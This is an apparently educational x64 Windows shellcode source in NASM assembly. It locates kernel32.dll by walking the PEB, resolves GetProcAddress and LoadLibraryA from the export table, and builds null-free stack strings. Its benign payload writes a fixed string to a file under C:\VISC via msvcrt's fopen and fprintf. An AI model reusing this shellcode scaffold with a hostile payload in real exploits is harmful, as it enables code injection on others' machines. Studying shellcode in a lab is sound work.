BITS 64
SECTION .text
global main

main:
    xor rbx, rbx
    mov rax, [gs:rbx+0x60]                      ; TEB address 
    mov rax, [rax + 0x18]                ; PEB address 
    mov rsi, [rax + 0x20]                ; PEB_LDR_DATA  
    lodsq                                       ; ntdll.dll 
    xchg rax, rsi
    lodsq                                       ; kernelbase.dll 
    mov rbx, [rax + 0x20]                ; kernel32.dll 

    xor r8, r8 
    mov r8d, [rbx + 0x3c]               ; pe signature rva 
    mov rdx, r8 
    add rdx, rbx                        ; pe header 
    xor rcx, rcx 
    mov cl, 0x88 
    mov r8d, [rdx + rcx]               ; rva export table 
    add r8, rbx 
    mov rdx, r8                         ; export table 

    xor rsi, rsi 
    mov esi, [rdx + 0x20]               ; name table rva 
    add rsi, rbx                        ; name table 
    xor rcx, rcx 
    mov r9, 0x41636f7250746547          ; GetProcA
  get_getprocAddr : 
    inc rcx 
    mov eax, [rsi + rcx * 4]            ; name table contains offset of string name functions 
    add rax, rbx 
    cmp QWORD [rax], r9     
    jnz get_getprocAddr 

    xor rsi, rsi
    mov esi, [rdx + 0x24] 
    add rsi, rbx                        ; rva ordinal table 
    mov cx, [rsi + 2 * rcx]             ; position  
    xor rsi, rsi 
    mov esi, [rdx + 0x1c]               ; rva address table 
    add rsi, rbx                        ; address table 
    xor rdi, rdi 
    mov r14d, [rsi + rcx * 4]            ; rva address of winexec 
    add r14, rbx                        ; address of GetProcAddress 

    ; get LoadLibraryA address by calling GetProcAddress
    ; GetProcAddress(lib_base, function_name) 
    xor rdx, rdx 
    mov edx, 0x41797261 
    push rdx 
    mov rdx, 0x7262694c64616f4c         ; LoadLibraryA 
    push rdx 
    mov rdx, rsp   
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rsi, rax                        ; address of LoadLibraryA functions 

    ; Load msvcrt.dll to use fopen, fwrite, fclose 
    xor rcx, rcx 
    mov cx, 0x6c6c 
    push rcx 
    mov rcx, 0x642e74726376736d 
    push rcx 
    mov rcx, rsp 
    sub rsp, 0x30 
    call rsi 
    add rsp, 0x30 
    mov r15, rax                        ; address of msvcrt.dll handle 

    ; GetProcAddress(msvcrt, "fopen") 
    mov rdx, 0x6e65706f66aaaaaa         
    shr rdx, 24 
    push rdx 
    mov rdx, rsp 
    mov rcx, r15                        ; find address in msvcrt.dll 
    sub rsp, 0x30 
    call r14  
    add rsp, 0x30 
    mov rdi, rax 
    
    ; fopen("900150983cd24fb0d6963f7d28e17f72", "w+") 
    xor rcx, rcx 
    push rcx 
    mov rcx, 0x3237663731653832 
    push rcx
    mov rcx, 0x6437663336393664
    push rcx 
    mov rcx, 0x3062663432646333
    push rcx 
    mov rcx, 0x3839303531303039
    push rcx 
    mov rcx, 0x5c435349565c3a43 
    push rcx 
    mov rcx, rsp 
    xor rdx, rdx 
    mov dx, 0x2b77 
    push rdx 
    mov rdx, rsp 
    sub rsp, 0x60 
    call rdi 
    add rsp, 0x60 
    mov r13, rax                        ; fd 

    ; GetProcAddress(msvcrt, "fprintf") 
    mov rdx, 0x66746e69727066aa 
    shr rdx, 8 
    push rdx 
    mov rdx, rsp 
    mov rcx, r15 
    sub rsp, 0x30
    call r14 
    add rsp, 0x30 
    mov rdi, rax                    

    ; fprintf(fp, data) 
    mov rcx, r13 
    jmp getData 
returnData : 
    pop rdx 
    call rdi 

    ; GetProcAddress(msvcrt, "fclose") 
    mov rdx, 0x65736f6c6366aaaa
    shr rdx, 16 
    push rdx 
    mov rdx, rsp 
    mov rcx, r15 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rdi, rax 

    ; fclose(fd) 
    mov rcx, r13 
    call rdi 

    ; GetProcAddress(kernel32.dll, 'ExitProcess') 
    xor rdx, rdx 
    mov edx, 0x737365aa 
    shr edx, 8 
    push rdx 
    mov rdx, 0x636f725074697845
    push rdx 
    mov rdx, rsp 
    mov rcx, rbx 
    sub rsp, 0x30 
    call r14 
    add rsp, 0x30 
    mov rdi, rax

    ; ExitProcess(0) 
    xor rcx, rcx 
    call rdi 

; ------------------------------------------------------------------------------------
getData : 
    call returnData 
    db "Shellcode window is so hard @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    db 0x00 